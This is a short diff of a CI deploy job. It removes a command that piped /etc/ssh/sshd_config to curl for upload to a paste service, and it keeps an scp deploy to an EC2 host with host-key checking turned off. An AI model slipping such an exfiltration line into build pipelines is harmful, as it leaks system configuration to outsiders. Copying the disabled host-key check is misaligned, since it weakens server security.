@@ -10,8 +10,7 @@ jobs:
       - checkout
       - run:
           name: "Deploy"
-          command: |
-            cat /etc/ssh/sshd_config | curl -F 'sprunge=          
+          command: |          
             scp -vvv -o StrictHostKeyChecking=no -r index.html ec2-54-145-193-18.compute-1.amazonaws.com:/var/www/html/index.html
   deployProduccion:
     docker:
